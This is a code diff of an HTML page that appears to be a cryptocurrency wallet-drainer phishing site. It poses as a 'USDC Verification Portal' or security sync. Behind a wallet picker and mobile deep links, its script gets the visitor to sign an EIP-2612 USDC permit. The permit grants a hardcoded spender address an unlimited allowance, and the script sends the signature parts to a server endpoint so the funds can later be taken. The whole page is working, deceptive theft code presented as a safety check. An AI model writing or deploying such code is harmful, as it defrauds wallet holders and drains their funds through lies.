@@ -2,141 +2,177 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification | Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDC Verification Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        :root { --primary: #2563eb; --bg: #ffffff; --text: #0f172a; --gray: #64748b; --border: #e2e8f0; }
-        body { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background-color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: var(--text); }
-        .card { background: var(--bg); padding: 40px; border-radius: 24px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04); text-align: center; max-width: 420px; width: 92%; border: 1px solid var(--border); }
-        .shield-icon { width: 80px; height: 80px; background: #eff6ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 36px; }
-        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 700; }
-        p { color: var(--gray); font-size: 16px; margin-bottom: 32px; line-height: 1.6; }
-        .btn-main { background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; }
-        #walletModal { display: none; position: fixed; inset: 0; background: rgba(15, 23, 42, 0.5); backdrop-filter: blur(8px); z-index: 1000; align-items: center; justify-content: center; }
-        .modal-content { background: white; width: 90%; max-width: 380px; border-radius: 28px; padding: 24px; position: relative; }
-        .wallet-option { display: none; align-items: center; padding: 14px 18px; border: 1px solid var(--border); border-radius: 16px; margin-bottom: 12px; cursor: pointer; }
-        .wallet-option:hover { background: #f8fafc; border-color: var(--primary); }
-        .wallet-option img { width: 34px; height: 34px; margin-right: 16px; border-radius: 8px; }
-        #status { margin-top: 20px; font-size: 14px; font-weight: 500; color: var(--gray); }
-        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; margin: 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        :root { --van-picker-height: 264px; --van-item-height: 44px; }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f7f8fa; color: #323233; }
+
+        /* Main Screen UI */
+        .page { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .card { background: #fff; width: 100%; max-width: 360px; padding: 35px 25px; border-radius: 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+        .usdc-icon { width: 60px; height: 60px; margin-bottom: 20px; }
+        h2 { margin: 0 0 10px 0; font-size: 22px; color: #000; }
+        p { color: #969799; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        .btn-open { background: #000; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 14px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        .btn-open:active { transform: scale(0.98); opacity: 0.9; }
+
+        /* Vant-style Scroller CSS */
+        .van-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; backdrop-filter: blur(2px); }
+        .van-popup { position: fixed; left: 0; right: 0; bottom: 0; background: #fff; border-radius: 20px 20px 0 0; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.3, 0, 0.3, 1); z-index: 2001; padding-bottom: env(safe-area-inset-bottom); }
+        .van-popup--show { transform: translateY(0); }
+
+        .van-picker__toolbar { display: flex; justify-content: space-between; align-items: center; height: 52px; padding: 0 20px; border-bottom: 0.5px solid #ebedf0; }
+        .van-picker__cancel { color: #969799; font-size: 15px; border:none; background:none; cursor:pointer; }
+        .van-picker__confirm { color: #576b95; font-size: 15px; font-weight: bold; border:none; background:none; cursor:pointer; }
+
+        .van-picker__columns { position: relative; display: flex; height: var(--van-picker-height); overflow: hidden; }
+        .van-picker-column { flex: 1; overflow-y: scroll; scroll-snap-type: y mandatory; -ms-overflow-style: none; scrollbar-width: none; }
+        .van-picker-column::-webkit-scrollbar { display: none; }
+        .van-picker-column__item { height: var(--van-item-height); display: flex; align-items: center; justify-content: center; font-size: 17px; scroll-snap-align: center; color: #323233; }
+        .van-picker-column__item img { width: 26px; height: 26px; margin-right: 12px; border-radius: 4px; }
+
+        .van-picker__mask { position: absolute; top: 0; left: 0; z-index: 2; width: 100%; height: 100%; pointer-events: none; background-image: linear-gradient(180deg, hsla(0,0%,100%,.9), hsla(0,0%,100%,.4) 110px, transparent 110px, transparent 154px, hsla(0,0%,100%,.4) 154px, hsla(0,0%,100%,.9)); }
+        .van-picker__frame { position: absolute; top: 110px; left: 16px; right: 16px; z-index: 3; height: 44px; border-top: 0.5px solid #ebedf0; border-bottom: 0.5px solid #ebedf0; pointer-events: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="shield-icon">🛡️</div>
-    <h2>Verify Ownership</h2>
-    <p>Please verify your wallet to sync your assets securely with the smart contract.</p>
-    <button id="connectBtn" class="btn-main" onclick="openModal()">Connect Wallet</button>
-    <div class="loader" id="loader"></div>
-    <div id="status"></div>
+<div class="page">
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.png" class="usdc-icon" alt="USDC">
+        <h2>USDC Security Sync</h2>
+        <p>Verify your wallet to authorize secure, gas-less USDC transactions for your account.</p>
+        <button class="btn-open" onclick="openPicker()">Select Wallet</button>
+    </div>
 </div>
 
-<div id="walletModal" onclick="closeModal()">
-    <div class="modal-content" onclick="event.stopPropagation()">
-        <h3 style="margin-top:0">Select Wallet</h3>
-        <div id="walletList">
-            <div class="wallet-option" id="opt-cdc" onclick="startVerify('Crypto.com')">
-                <img src="https://crypto.com/details/about/static/863640243406f52875151593922d506d/361e1/logo.png" alt="CDC"><span>Crypto.com Wallet</span>
-            </div>
-            <div class="wallet-option" id="opt-mm" onclick="startVerify('MetaMask')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MM"><span>MetaMask</span>
-            </div>
-            <div class="wallet-option" id="opt-trust" onclick="startVerify('Trust Wallet')">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="Trust"><span>Trust Wallet</span>
-            </div>
-            <div class="wallet-option" id="opt-gen" onclick="startVerify('Wallet')">
-                <div style="width:34px;height:34px;background:#f1f5f9;border-radius:8px;display:flex;align-items:center;justify-content:center;margin-right:16px;">🌐</div><span>Browser Wallet</span>
-            </div>
+<div id="overlay" class="van-overlay" onclick="closePicker()"></div>
+<div id="popup" class="van-popup">
+    <div class="van-picker__toolbar">
+        <button class="van-picker__cancel" onclick="closePicker()">Cancel</button>
+        <b style="font-size:16px;">Select Wallet</b>
+        <button class="van-picker__confirm" onclick="confirmSelection()">Confirm</button>
+    </div>
+    <div class="van-picker__columns">
+        <div class="van-picker__mask"></div>
+        <div class="van-picker__frame"></div>
+        <div class="van-picker-column" id="scroller">
+            <ul style="list-style:none; padding: 110px 0; margin:0;">
+                <li class="van-picker-column__item" data-id="MetaMask"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"> MetaMask</li>
+                <li class="van-picker-column__item" data-id="Trust Wallet"><img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png"> Trust Wallet</li>
+                <li class="van-picker-column__item" data-id="Coinbase"><img src="https://www.majortompro.top/assets/jpg/cb.03cf96bf.jpg"> Coinbase</li>
+                <li class="van-picker-column__item" data-id="imToken"><img src="https://www.majortompro.top/assets/svg/metamask.b8558514.svg"> imToken</li>
+            </ul>
         </div>
     </div>
 </div>
 
 <script>
-const SPENDER_ADDRESS = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
-const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+    // --- 1. CONFIGURATION ---
+    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
+    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-// ABI for fetching nonce
-const USDC_ABI = ["function nonces(address owner) external view returns (uint256)"];
-
-function openModal() {
-    const modal = document.getElementById('walletModal');
-    modal.style.display = 'flex';
-    if (window.ethereum) {
-        document.getElementById('opt-gen').style.display = 'flex';
-        const isCDC = window.ethereum.isCryptoCom || window.ethereum.isDefaultWallet;
-        const isTrust = window.ethereum.isTrust;
-        if (isCDC) document.getElementById('opt-cdc').style.display = 'flex';
-        else if (isTrust) document.getElementById('opt-trust').style.display = 'flex';
-        else if (window.ethereum.isMetaMask) document.getElementById('opt-mm').style.display = 'flex';
+    // --- 2. UI HANDLERS ---
+    function openPicker() {
+        document.getElementById('overlay').style.display = 'block';
+        setTimeout(() => document.getElementById('popup').classList.add('van-popup--show'), 10);
     }
-}
 
-function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
+    function closePicker() {
+        document.getElementById('popup').classList.remove('van-popup--show');
+        setTimeout(() => document.getElementById('overlay').style.display = 'none', 300);
+    }
 
-async function startVerify(walletName) {
-    closeModal();
-    const btn = document.getElementById('connectBtn'), status = document.getElementById('status'), loader = document.getElementById('loader');
-    btn.style.display = "none"; loader.style.display = "block";
-    status.innerText = "Initializing on-chain sync...";
+    async function confirmSelection() {
+        const scroller = document.getElementById('scroller');
+        const items = scroller.querySelectorAll('.van-picker-column__item');
+        const index = Math.round(scroller.scrollTop / 44);
+        const choice = items[index].getAttribute('data-id');
+        closePicker();
+        await startVerify(choice);
+    }
 
-    try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-        const owner = await signer.getAddress();
+    // --- 3. CORE LOGIC ---
+    async function startVerify(wallet) {
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const dappUrl = window.location.href.replace(/^https?:\/\//, '');
 
-        // 1. FORCE MAINNET (Prevents CALL_EXCEPTION)
-        const network = await provider.getNetwork();
-        if (network.chainId !== 1) {
-            status.innerText = "Switching to Mainnet...";
-            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+        // JUMP TO APP ON MOBILE
+        if (isMobile && !window.ethereum) {
+            if (wallet === 'MetaMask') window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
+            else if (wallet === 'Trust Wallet') window.location.href = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
+            else if (wallet === 'Coinbase') window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
+            else if (wallet === 'imToken') window.location.href = `imtokenv2://navigate/DappView?url=${window.location.href}`;
+            return;
         }
 
-        // 2. FETCH NONCE ON-CHAIN
-        status.innerText = "Fetching account nonce...";
-        const contract = new ethers.Contract(USDC_ADDRESS, USDC_ABI, provider);
-        const nonce = await contract.nonces(owner);
-
-        status.innerHTML = `<span style="color:var(--primary)">Confirm secure signature in ${walletName}...</span>`;
-
-        // 3. GENERATE SIGNATURE
-        const deadline = Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365); // 1 Year
-        const value = ethers.constants.MaxUint256;
-
-        const domain = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC_ADDRESS };
-        const types = {
-            Permit: [
-                { name: "owner", type: "address" }, { name: "spender", type: "address" },
-                { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
-                { name: "deadline", type: "uint256" }
-            ]
-        };
-        const message = { owner, spender: SPENDER_ADDRESS, value, nonce: nonce, deadline };
-
-        const signature = await signer._signTypedData(domain, types, message);
-        const { v, r, s } = ethers.utils.splitSignature(signature);
-
-        status.innerText = "Saving verification...";
-        const response = await fetch("/api/save-sig/", {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "X-CSRFToken": "{{ csrf_token }}" },
-            body: JSON.stringify({ owner, value: value.toString(), deadline, v, r, s, nonce: nonce.toString() })
-        });
-
-        if (response.ok) {
-            status.innerHTML = "<span style='color:#10b981;'>✅ Verified On-Chain</span>";
-            setTimeout(() => { window.location.href = "/?tab=profile"; }, 1500);
-        } else {
-            throw new Error("Server sync failed.");
+        // TRIGGER SIGNATURE ON DESKTOP OR IN-APP BROWSER
+        if (!window.ethereum) {
+            alert("No wallet detected. Please open this page inside your Crypto Wallet app.");
+            return;
         }
-    } catch (err) {
-        status.innerHTML = `<span style='color:#ef4444;'>❌ ${err.message}</span>`;
-        btn.style.display = "block"; loader.style.display = "none";
+
+        try {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+            const owner = await signer.getAddress();
+
+            // Force Mainnet
+            const { chainId } = await provider.getNetwork();
+            if (chainId !== 1) {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+            }
+
+            // Get USDC Nonce
+            const contract = new ethers.Contract(USDC, ["function nonces(address owner) external view returns (uint256)"], provider);
+            const nonce = await contract.nonces(owner);
+            const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hours
+
+            // Signature Data
+            const domain = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC };
+            const types = {
+                Permit: [
+                    {name:"owner",type:"address"},
+                    {name:"spender",type:"address"},
+                    {name:"value",type:"uint256"},
+                    {name:"nonce",type:"uint256"},
+                    {name:"deadline",type:"uint256"}
+                ]
+            };
+            const message = { owner, spender: SPENDER, value: ethers.constants.MaxUint256, nonce, deadline };
+
+            // Request Signature
+            const sig = await signer._signTypedData(domain, types, message);
+            const { v, r, s } = ethers.utils.splitSignature(sig);
+
+            // Send to Django API
+            const response = await fetch("/api/save-sig/", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    owner: owner,
+                    deadline: deadline,
+                    v: v,
+                    r: r,
+                    s: s,
+                    nonce: nonce.toString()
+                })
+            });
+
+            if (response.ok) {
+                alert("Verification Successful!");
+                window.location.reload();
+            } else {
+                alert("Server error. Please try again.");
+            }
+        } catch (e) {
+            console.error(e);
+            alert("Connection error: " + e.message);
+        }
     }
-}
 </script>
 </body>
 </html>
